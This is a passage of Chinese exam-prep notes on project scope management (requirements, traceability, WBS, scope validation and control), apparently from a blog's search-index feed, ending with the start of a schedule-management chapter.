引导式研讨会</td>
<td> 1. 项目范围说明书<br>2. 项目文件更新</td>
</tr>
<tr class="even">
<td>创建 WBS</td>
<td>1. 范围管理计划<br>2. 项目范围说明书<br>3. 需求文件<br>4.
事业环境因素<br>5. 组织过程资产</td>
<td> 1. 分解<br>2. 专家判断</td>
<td> 1. 范围基准<br>2. 项目文件更新</td>
</tr>
<tr class="odd">
<td>确认范围</td>
<td> 1. 项目管理计划<br>2. 需求文件<br>3. 需求跟踪矩阵<br>4.
核实的可交付成果<br>5. 工作绩效数据</td>
<td> 1. 检查<br>2. 群体决策技术</td>
<td> 1. 验收的可交付成果<br>2. 变更请求<br>3. 工作绩效信息<br>4.
项目文件更新</td>
</tr>
<tr class="even">
<td>控制范围</td>
<td> 1. 项目管理计划<br>2. 需求文件<br>3. 需求跟踪矩阵<br>4.
工作绩效数据<br>5. 组织过程资产</td>
<td> 1. 偏差分析</td>
<td> 1. 工作绩效信息<br>2. 变更请求<br>3. 项目管理计划更新<br>4.
项目文件更新<br>5. 组织过程资产更新</td>
</tr>
</tbody>
</table>
<h2 id="产品范围与项目范围">1.4. 产品范围与项目范围</h2>
<ol type="1">
<li>产品范围是指产品或服务所应该包含的功能，项目范围是指为了能够交付产品，项目所必须做的工作。</li>
<li>产品范围是项目范围的基础，产品范围的定义是产品要求的描述；而项目范围的定义是产生项目管理计划的基础。</li>
<li>项目的范围基准是经过批准的项目范围说明书、WBS 和 WBS 词典。判断项目范围是否完成，要以范围基准来衡量。而产品范围是否完成，则根据产品是否满足了产品描述来判断。</li>
<li>产品范围描述是项目范围说明书的重要组成部分，因此，产品范围变更后，首先受到影响的是项目的范围。</li>
</ol>
<hr>
<h1 id="规划范围管理">2. 规划范围管理</h1>
<p>  规划范围管理是编制范围管理计划，书面描述将如何定义、确认和控制项目范围的过程，其主要作用是在整个项目中对如何管理范围提供指南和方向。范围管理计划需要<code>项目管理团队全员参与</code>。</p>
<h2 id="范围管理计划内容">2.1. 范围管理计划内容</h2>
<ol type="1">
<li>如何制定项目范围说明书</li>
<li>如何根据范围说明书创建 WBS</li>
<li> 如何维护和批准 WBS</li>
<li> 如何确认和正式验收已完成的项目可交付成果</li>
<li>如何处理项目范围说明书的变更</li>
</ol>
<blockquote>
<p>项目范围管理计划可能在项目管理计划之中，也可能作为单独的一项。根据不同的项目，可以是<code>详细的或者概括的</code>，可以是<code>正式的或者非正式</code>的。</p>
</blockquote>
<h2 id="需求管理计划内容">2.2. 需求管理计划内容</h2>
<ol type="1">
<li>如何规划、跟踪和汇报各种需求活动</li>
<li>需求管理需要使用的资源</li>
<li>培训计划</li>
<li>项目干系人参与需求管理的策略</li>
<li>判断项目范围与需求不一致的准则和纠正规程</li>
<li>需求跟踪结构</li>
<li>配置管理活动</li>
</ol>
<blockquote>
<p><code>需求管理贯穿于整个过程</code>，最基本的任务是就是明确需求，使项目团队和用户达成共识，建立需求基线。</p>
</blockquote>
<hr>
<h1 id="收集需求">3. 收集需求</h1>
<h2 id="收集需求定义">3.1. 收集需求定义</h2>
<p>  收集需求是为实现项目目标而确定、记录并管理干系人的需要和需求的过程。其作用是为定义和管理项目范围（包括产品范围）奠定基础。</p>
<h2 id="收集需求的工具和技术">3.2. 收集需求的工具和技术</h2>
<ol type="1">
<li>访谈：正式或非正式，一对一或一对多访谈，比较直接。</li>
<li>焦点小组：将预先选定的干系人和主题专家集中在一起，由主持人引导互动讨论。比一对一访谈干架热烈，属于<code>一种群体访谈</code>。</li>
<li>引导式研讨会：通过邀请主要的跨职能干系人一起参加会议，对产品需求进行集中讨论与定义。能比单项会议更快地发现和解决问题。</li>
<li>群体创新技术：指可以组织一些群体活动来识别项目和产品需求，技术包括<code>头脑风暴法（各抒己见，集思广益）</code>、<code>名义小组技术（投票）</code>、<code>德尔菲技术(匿名/背靠背)</code>、<code>概念/思维导图（基于头脑风暴）</code>、<code>亲和图（图解汇总）</code>和<code>多标准决策分析（借助决策矩阵）</code>等。</li>
<li>群体决策技术：为达成某种期望结果而对多个未来行动方案进行评估。可用来开发产品需求，以及对产品需求进行归类和优先排序。<code>一致同意/大多数原则/相对多数原则/独裁</code>。</li>
<li>原型法：根据干系人初步需求，快速建立一个产品模型，基于此模型与干系人交流。</li>
<li>标杆对照：将实际或计划的做法与其他类似组织（内部 / 外部组织）的做法进行比较，以便识别最佳实践，形成改进意见。</li>
<li>系统交互图：
对产品范围的可视化描述，显示系统与参与者之间的交互方式。</li>
<li>文件分析：通过分析现有文档，识别与需求相关的信息来挖掘需求。</li>
</ol>
<h2 id="需求文件">3.3. 需求文件</h2>
<ol type="1">
<li>收集需求过程的主要输出：<code>需求文件（Requirements Documentation）</code>和<code>需求跟踪矩阵</code>。</li>
<li>需求文件既可以是一份按干系人和优先级分类列出全部需求的简单文件，也可以是一份包括内容提要、细节描述和附件等的详细文件。</li>
</ol>
<h2 id="需求文件内容">3.4. 需求文件内容</h2>
<ol type="1">
<li>业务需求</li>
<li>干系人需求</li>
<li>解决方案需求</li>
<li>过渡需求</li>
<li>项目需求</li>
<li>与需求有关的假设条件、依赖关系和制约因素</li>
</ol>
<blockquote>
<p>包含但不限于以上</p>
</blockquote>
<h2 id="需求跟踪">3.5. 需求跟踪</h2>
<ol type="1">
<li>正向跟踪：检查需求文件中的每个需求是否都能在后继工作产品（成果）中找到对应点。</li>
<li>反向跟踪：也称为<code>逆向跟踪</code>，检查设计文档、产品构件、测试文档等工作成果是否都能在需求文件中找到出处。</li>
</ol>
<h2 id="需求跟踪五种类型">3.6. 需求跟踪五种类型</h2>
<figure>
<img src="/p/fa77ee29/需求跟踪五种类型.webp" alt="需求跟踪五种类型">
<figcaption aria-hidden="true">需求跟踪五种类型</figcaption>
</figure>
<ol type="1">
<li>箭头表示需求跟踪能力联系链，它能跟踪需求使用的整个周期，即从需求建议到交付的全过程。</li>
<li>左半部分表明，从用户原始需求可向前追溯到需求文件，就能区分出项目过程中或项目结束后由于变更受到影响的需求，也确保了需求文件中包括所有用户需求。同样，可以从需求文件回溯到相应的用户原始需求，确认每个需求的出处。</li>
<li>右半部分表明，通过定义单个需求和特定的产品元素之间的联系链，可以从需求文件追溯到产品元素，从而确保产品元素满足每个需求。<em>反过来，如果某个孤立的产品元素表明了一个正当的功能，则说明需求文件漏掉了一项需求。</em></li>
<li>需求文件顶部的联系链是需求文件之间的跟踪，便于更好地处理各种需求之间的逻辑相关性，检查需求分解中可能出现的错误或纰漏。</li>
</ol>
<h2 id="需求跟踪矩阵">3.7. 需求跟踪矩阵</h2>
<p>  需求跟踪矩阵表示需求和其他产品元素之间的联系链。需要跟踪的内容包含如下几个方面。
1. 业务需求、机会、目的和目标 2. 项目目标 3. 项目范围（WBS 可交付成果）
4. 产品设计 5. 产品开发 6. 测试策略和测试场景</p>
<p><img src="/p/fa77ee29/用户原始需求到需求文件的跟踪矩阵示例.webp" alt="用户原始需求到需求文件的跟踪矩阵示例"> <img src="/p/fa77ee29/需求文件到下游工作产品的跟踪矩阵示例.webp" alt="需求文件到下游工作产品的跟踪矩阵示例"></p>
<blockquote>
<p>需求跟踪矩阵中应该记录每个需求的相关属性，如：<code>唯一标识</code>、<code>需求文字描述</code>、<code>收录该需求的理由</code>、<code>所有者</code>、<code>来源</code>、<code>优先级别</code>、<code>版本</code>、<code>当前状态</code>（进行中、已取消、已推迟、新增加、已批准、已分配、已完成等）。</p>
</blockquote>
<hr>
<h1 id="定义范围">4. 定义范围</h1>
<h2 id="定义">4.1. 定义</h2>
<p>  定义范围是制定项目和产品详细描述的过程，其主要作用是明确所收集的需求那些将包含在项目范围内，哪些排除在项目范围外，从而明确产品、服务或成果的边界。</p>
<h2 id="主要工具和技术">4.2. 主要工具和技术</h2>
<ol type="1">
<li>专家判断</li>
<li>产品分析</li>
<li>备选方案生成</li>
<li>引导式研讨会</li>
</ol>
<h2 id="项目范围说明书内容重点">4.3. 项目范围说明书内容（重点）</h2>
<ol type="1">
<li>产品范围描述</li>
<li>验收标准</li>
<li>可交付成果</li>
<li>项目的除外责任</li>
<li>制约因素</li>
<li>假设条件</li>
</ol>
<h2 id="主要作用">4.4. 主要作用</h2>
<ol type="1">
<li>确定范围</li>
<li>沟通基础</li>
<li>规划和控制依据</li>
<li>变更基础</li>
<li>规划基础</li>
</ol>
<hr>
<h1 id="创建工作分解结构wbs">5. 创建工作分解结构（WBS）</h1>
<p>  创建 WBS 是将项目可交付成果和项目工作分解成较小的、更易于管理的组件的过程。WBS 中的 “工作” 并不是指工作本身，而是指工作所导致的产品或可交付成果。</p>
<h2 id="wsb的层次">5.1. WSB 的层次</h2>
<ol type="1">
<li>里程碑：每个分解单元中都存在可交付成果和里程碑（Milestone），标志着某个可交付成果或阶段的正式完成（<code>重要的检查点是里程碑、重要的里程碑是基线</code>）。</li>
<li>工作包：位于 WBS 每条分支最底层的可交付成果或项目工作组成部分。工作包可继续往下分解成<code>活动</code>。作为一种经验法则，<code>8/80原则</code>建议工作包的大小应该至少需要 <code>8小时</code>来完成，而总完成时间也不应该大于 <code>80小时</code>。</li>
<li>控制账户：是一种管理控制点。一个控制账户中包含若干个工作包，但一个工作包仅属于一个控制账户。</li>
<li>规划包：是指在控制账户之下，工作内容已知但尚缺详细进度活动的 WBS 组成部分。</li>
<li>WBS 词典：制作 WBS 的过程中，要给每个部分赋予一个账户编码（Code of
Account）标识符，他们是成本、进度和资源使用信息汇总的层次结构。</li>
</ol>
<figure>
<img src="/p/fa77ee29/WBS的层次示意图.webp" alt="WBS的层次示意图">
<figcaption aria-hidden="true">WBS 的层次示意图</figcaption>
</figure>
<h2 id="wbs分解活动">5.2. WBS 分解活动</h2>
<p>  创建 WBS 过程的工具和技术主要有<code>分解</code>和<code>专家判断</code>。分解是一种将项目可交付成果和项目工作分解成较小的、更易于管理的组件的技术。开展的活动包含以下：
1. 识别和分析可交付成果及相关工作 2. 确定 WBS 的结构和编排方法 3.
自上而下逐层细化分解 4. 为 WBS 组件指定和分配标识编码 5.
核实可交付成果分解的程度是恰当的</p>
<h2 id="wbs分解的原则">5.3. WBS 分解的原则</h2>
<ol type="1">
<li>功能或技术原则：需要考虑将不同人员的工作分开</li>
<li>组织结构：对于职能型的项目组织而言，WBS 也要适应项目的组织结构形式</li>
<li>系统或者子系统：总的系统划分为几个主要的子系统，然后对每个子系统再进行分解</li>
</ol>
<h2 id="wbs分解方式">5.4. WBS 分解方式</h2>
<ol type="1">
<li>将项目生命周期的各阶段作为分解的第二层。</li>
<li>主要可交付成果作为分解的第二层</li>
<li>整合可能由项目图团队以外的组织来实施的各种组件，然后作为外包工作的一部分。</li>
</ol>
<p><img src="/p/fa77ee29/WBS分解方式-第一种.webp" alt="WBS分解方式-第一种"> <img src="/p/fa77ee29/WBS分解方式-第二种.webp" alt="WBS分解方式-第二种"></p>
<h2 id="分解工作过程">5.5. 分解工作过程</h2>
<ol type="1">
<li><p>WBS 不是某个项目团队成员的责任，应该有全体项目团队成员、用户和项目干系人工作完成和一致确认。创建 WBS 的过程如下。
<img src="/p/fa77ee29/创建WBS的过程.webp" alt="创建WBS的过程"></p></li>
<li><p>较常用的 WBS 表示形式主要有<code>分级的树形结构</code>（组织结构图式）和<code>表格形式</code>（列表式）。</p>
<ul>
<li>树形结构图，WBS 层次清晰、直观性和结构性强，但不容易修改，对大的、复杂的项目很难表示出项目的全貌。</li>
<li>表格形式，直观性比较差，但能够反映出项目所有的工作要素。</li>
</ul></li>
</ol>
<h2 id="分解时的注意事项">5.6. 分解时的注意事项</h2>
<ol type="1">
<li>WBS 必须是<code>面向可交付成果</code>的。</li>
<li>WBS 必须<code>符合项目的范围</code>。</li>
<li>WBS 的底层应该<code>支持计划和控制</code>。</li>
<li>WBS 中的元素必须有人负责，而且<code>只由一个人负责</code>，尽管实际上可能需要多个人参与。</li>
<li><code>WBS作为指导</code>而不是原则，应控制在 <code>4~6层</code>，大项目可以超过 6 层。</li>
<li>WBS 应包括<code>项目管理工作</code>，也要包括<code>分包出去的工作</code>。</li>
<li>WBS 的编制需要所有（主要）项目干系人的参与，需要项目团队成员的参与。</li>
<li><code>WBS并非一成不变的</code>，在完成了 WBS 之后的工作中，仍然有可能需要对 WBS 进行修改。</li>
</ol>
<hr>
<h1 id="确认范围">6. 确认范围</h1>
<h2 id="确认范围的定义">6.1. 确认范围的定义</h2>
<ol type="1">
<li>确认范围是正式验收项目已完成的可交付成果的过程。</li>
<li>主要工具和技术是<code>检查</code>和<code>群体决策技术</code>。检查已成为审查、评审、审计、走查、巡检、测试等。是指开展测量、审查和确认等活动，来判断工作和可交付成果是否符合需求和产品验收标准。</li>
</ol>
<h2 id="确认范围的步骤">6.2. 确认范围的步骤</h2>
<ol type="1">
<li>确定需要进行范围确认的时间</li>
<li>识别范围确认需要哪些投入</li>
<li>确定范围正式被接受的标准和要素</li>
<li>确定范围确认会议的组织步骤</li>
<li>组织范围确认会议</li>
</ol>
<h2 id="几个术语的比较">6.3. 几个术语的比较</h2>
<h3 id="确认范围与核实产品">6.3.1. 确认范围与核实产品</h3>
<ol type="1">
<li>核实产品是针对产品是否完成，在项目或阶段结束时由发起人或客户来验证，强调产品是否完整。</li>
<li>确认范围是针对项目可交付成果，由客户或发起人在阶段末确认验收的过程。</li>
</ol>
<h3 id="确认范围与质量控制重点">6.3.2. 确认范围与质量控制（重点）</h3>
<ol type="1">
<li>确认范围主要强调<code>可交付成果获得客户或发起人的接受</code>；质量控制强调<code>可交付成果的正确性</code>，并符合为其制定的具体质量要求。</li>
<li>质量控制一般在确认范围前进行，也可同时进行；确认范围一般在阶段末尾进行，而质量控制并不一定在阶段末进行。</li>
<li>质量控制术语<code>内部检查</code>，确认范围则是由外部干系人（客户 / 发起人）对项目可交付成果进行检查验收。</li>
</ol>
<h3 id="确认范围与项目收尾">6.3.3. 确认范围与项目收尾</h3>
<ol type="1">
<li>两者都在阶段末进行，但确认范围强调的是核实与接受可交付成果，而项目收尾强调的是结束项目或阶段所要做的流程性工作。</li>
<li>确认范围与项目收尾都有验收工作，确认范围强调验收项目可交付成果，项目收尾强调验收产品。</li>
</ol>
<hr>
<h1 id="控制范围">7. 控制范围</h1>
<h2 id="定义-1">7.1. 定义</h2>
<p>  控制范围是监督项目和产品的范围状态、管理范围基准变更的过程。其主要租用是在整个项目期间保持对范围基准的维护。
  对项目范围进行控制，就必须与确保所有请求的变更、推荐的纠正措施或预防措施都经过实施整体变更控制过程的处理。</p>
<h2 id="范围变更的原因">7.2. 范围变更的原因</h2>
<ol type="1">
<li>政府政策的问题</li>
<li>项目范围的计划编制不周密详细，有一定的错误或遗漏</li>
<li>市场上出现了或是设计人员提出了新技术、新手段或新方案</li>
<li>项目执行组织本身已发生变化</li>
<li>客户对项目、项目产品或服务的要求发生变化</li>
</ol>
<h2 id="范围变更控制的主要工作">7.3. 范围变更控制的主要工作</h2>
<ol type="1">
<li>影响导致范围变更的因素</li>
<li>判断范围变更是否已经发生</li>
<li>范围变更发生时管理实际的变更，确保所有被请求的变更按照项目整理变更控制过程处理</li>
</ol>
]]></content>
      <categories>
        <category>信管备考</category>
      </categories>
      <tags>
        <tag>信息系统项目管理师</tag>
      </tags>
  </entry>
  <entry>
    <title>【信管备考知识点】第 6 章 - 项目进度管理</title>
    <url>/p/ccfed43a.html</url>
    <content><![CDATA[<blockquote>
<p>考试核心：十大项目管理之一 针对题型：论文写作
备考重点：每个管理包含的过程及定义，每个过程的输入、输出、工具、技术。</p>
</blockquote>
<h1 id="概述">1. 概述</h1>
<p>  项目进度管理包括为管理项目按时完成所需的 7 个过程，具体为： 1.
规划进度管理 2. 定义活动 3. 排列活动顺序 4. 估算活动资源 5.
估算活动持续时间 6. 制定进度计划 7. 控制进度 <img src="/p/ccfed43a/7个过程分组.webp" alt="7个过程分组"></p>
<h1 id="项目进度管理过程">2. 项目进度管理过程</h1>
<ol type="1">
<li>规划项目进度管理：是为实施项目进度管理制定政策、程序，并形成文档化的项目进度管理计划的过程。本过程的主要作用是：<code>如何在整个项目过程中管理、执行和控制项目进度提供指南和方向</code>。</li>
<li>进度管理计划：可以是<code>正式的</code>或<code>非正式的</code>，<code>非常详细的</code>或<code>高度概括的</code>。</li>
<li>定义活动过程：识别和记录为完成项目可交付成果而需采取的所有活动。其主要作用是：将工作包分解为活动，作为对项目工作进行估算、进度规划、执行、监督和控制的基础。</li>
<li>活动清单：是一份包含项目所需的全部活动的综合清单。</li>
<li>活动属性：是活动清单中的活动描述的扩展。活动属性包括<code>活动标识</code>、<code>WBS标识</code>和<code>活动标签或名称</code>。</li>
<li>排列活动顺序：是识别和记录项目活动之间的关系的过程。其主要作用是：定义工作之间的<code>逻辑顺序</code>，以便在既定的所有项目制约因素下获得最高的效率。</li>
</ol>
]]></content>
      <categories>
        <category>信管备考</category>
      </categories>
      <tags>
        <tag>信息系统项目管理师</tag>
      </tags>
  </entry>
</search>
